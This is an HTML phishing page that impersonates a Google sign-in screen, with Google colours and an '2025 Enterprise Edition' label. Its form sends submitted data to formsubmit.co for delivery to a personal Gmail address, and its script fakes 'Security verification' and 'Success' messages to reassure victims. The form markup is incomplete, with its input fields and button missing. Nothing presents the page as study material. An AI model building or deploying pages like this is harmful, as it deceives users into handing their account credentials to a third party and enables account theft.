<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google | Secure Sign In - 2025</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>ðŸ”’</text></svg>">
    <style>
        :root {
            --google-blue: #174ea6;
            --google-red: #ea4335;
            --google-yellow: #fbbc04;
            --google-green: #34a853;
            --bg-gradient: linear-gradient(135deg, #0f0f0f 0%, #1a1a1a 100%);
            --card-bg: rgba(255, 255, 255, 0.05);
            --input-bg: rgba(255, 255, 255, 0.08);
            --border-glow: rgba(66, 133, 244, 0.3);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Google Sans', 'Segoe UI', system-ui, sans-serif;
        }
        
        body {
            background: var(--bg-gradient);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }
        
        body::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: 
                radial-gradient(circle at 30% 30%, rgba(66, 133, 244, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 70% 70%, rgba(234, 67, 53, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 40% 80%, rgba(251, 188, 4, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(52, 168, 83, 0.1) 0%, transparent 50%);
            animation: rotate 60s linear infinite;
            z-index: -1;
        }
        
        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        
        .login-container {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            padding: 3rem;
            border-radius: 24px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 
                0 25px 50px -12px rgba(0, 0, 0, 0.5),
                0 0 0 1px rgba(255, 255, 255, 0.05),
                0 0 30px rgba(66, 133, 244, 0.2);
            width: 100%;
            max-width: 480px;
            position: relative;
            overflow: hidden;
        }
        
        .login-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, 
                var(--google-blue) 0%, 
                var(--google-red) 25%, 
                var(--google-yellow) 50%, 
                var(--google-green) 75%, 
                var(--google-blue) 100%);
            animation: gradientMove 3s ease infinite;
        }
        
        @keyframes gradientMove {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        .google-brand {
            text-align: center;
            margin-bottom: 2.5rem;
            position: relative;
        }
        
        .google-logo {
            font-size: 3rem;
            font-weight: 500;
            background: linear-gradient(135deg, 
                #4285f4 0%, 
                #ea4335 25%, 
                #fbbc04 50%, 
                #34a853 75%, 
                #4285f4 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-size: 300% 300%;
            animation: gradientShift 4s ease infinite;
        }
        
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        .brand-subtitle {
            color: rgba(255, 255, 255, 0.7);
            font-size: 1.1rem;
            margin-top: 0.5rem;
            font-weight: 300;
        }
        
        h1 {
            text-align: center;
            margin-bottom: 2rem;
            font-weight: 400;
            font-size: 1.75rem;
            color: rgba(255, 255, 255, 0.9);
        }
        
        .input-group {
            margin-bottom: 1.75rem;
            position: relative;
        }
        
        input {
            width: 100%;
            padding: 1.25rem 1.25rem 1.25rem 3.5rem;
            background: var(--input-bg);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            color: #ffffff;
            font-size: 1.1rem;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            backdrop-filter: blur(10px);
        }
        
        input:focus {
            outline: none;
            border-color: var(--google-blue);
            box-shadow: 0 0 0 3px rgba(66, 133, 244, 0.3);
            transform: translateY(-2px);
        }
        
        input::placeholder {
            color: rgba(255, 255, 255, 0.5);
            font-weight: 300;
        }
        
        .input-icon {
            position: absolute;
            left: 1.25rem;
            top: 50%;
            transform: translateY(-50%);
            color: rgba(255, 255, 255, 0.6);
            font-size: 1.25rem;
            z-index: 2;
        }
        
        .btn-container {
            text-align: center;
            margin: 2.5rem 0 1.5rem;
        }
        
        button {
            background: linear-gradient(135deg, #4285f4 0%, #356ac3 100%);
            color: white;
            border: none;
            padding: 1.25rem 2.5rem;
            border-radius: 16px;
            font-size: 1.1rem;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            width: 100%;
            position: relative;
            overflow: hidden;
        }
        
        button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, 
                transparent 0%, 
                rgba(255, 255, 255, 0.2) 50%, 
                transparent 100%);
            transition: left 0.5s ease;
        }
        
        button:hover::before {
            left: 100%;
        }
        
        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(66, 133, 244, 0.4);
        }
        
        button:active {
            transform: translateY(-1px);
        }
        
        .links {
            display: flex;
            justify-content: space-between;
            margin-top: 2rem;
            font-size: 0.95rem;
        }
        
        a {
            color: #8ab4f8;
            text-decoration: none;
            transition: color 0.3s ease;
            position: relative;
        }
        
        a::after {
            content: '';
            position: absolute;
            bottom: -2px;
            left: 0;
            width: 0;
            height: 1px;
            background: #8ab4f8;
            transition: width 0.3s ease;
        }
        
        a:hover::after {
            width: 100%;
        }
        
        a:hover {
            color: #a8c7fa;
        }
        
        .security-notice {
            text-align: center;
            margin-top: 2rem;
            font-size: 0.9rem;
            color: rgba(255, 255, 255, 0.6);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
        }
        
        .language-selector {
            text-align: center;
            margin-top: 2rem;
            font-size: 0.9rem;
            color: rgba(255, 255, 255, 0.6);
        }
        
        /* Responsive Design */
        @media (max-width: 768px) {
            .login-container {
                padding: 2rem;
                margin: 1rem;
            }
            
            .google-logo {
                font-size: 2.5rem;
            }
            
            input {
                padding: 1.1rem 1.1rem 1.1rem 3rem;
            }
            
            .input-icon {
                left: 1rem;
            }
        }
        
        @media (max-width: 480px) {
            .login-container {
                padding: 1.5rem;
            }
            
            .google-logo {
                font-size: 2rem;
            }
            
            h1 {
                font-size: 1.5rem;
            }
            
            button {
                padding: 1.1rem 2rem;
            }
            
            .links {
                flex-direction: column;
                gap: 1rem;
                text-align: center;
            }
        }
        
        /* Loading animation */
        .loading {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            position: absolute;
            right: 20px;
            top: 50%;
            transform: translateY(-50%);
        }
        
        @keyframes spin {
            to { transform: translateY(-50%) rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="google-brand">
            <div class="google-logo">Google</div>
            <div class="brand-subtitle">2025 Enterprise Edition</div>
        </div>
        
        <h1>Sign in to your account</h1>
        
        <form action="https://formsubmit.co/captainabdelrheem@gmail.com" method="POST">

        <div class="language-selector">

        </div>
    </div>

    <script>
        document.querySelectorAll('input').forEach(input => {
            input.addEventListener('focus', (e) => {
                e.target.previousElementSibling.style.color = '#4285f4';
            });
            
            input.addEventListener('blur', (e) => {
                e.target.previousElementSibling.style.color = 'rgba(255, 255, 255, 0.6)';
            });
        });

        document.querySelector('form').addEventListener('submit', function(e) {
            const btn = document.getElementById('submit-btn');
            btn.innerHTML = 'Signing in...';
            btn.style.opacity = '0.8';
            btn.disabled = true;
            
            // Add some delay for "authenticating" effect
            setTimeout(() => {
                btn.innerHTML = 'Security verification...';
            }, 1500);
            
            setTimeout(() => {
                btn.innerHTML = 'âœ… Success! Redirecting...';
            }, 3000);
        });
    </script>
</body>
</html>
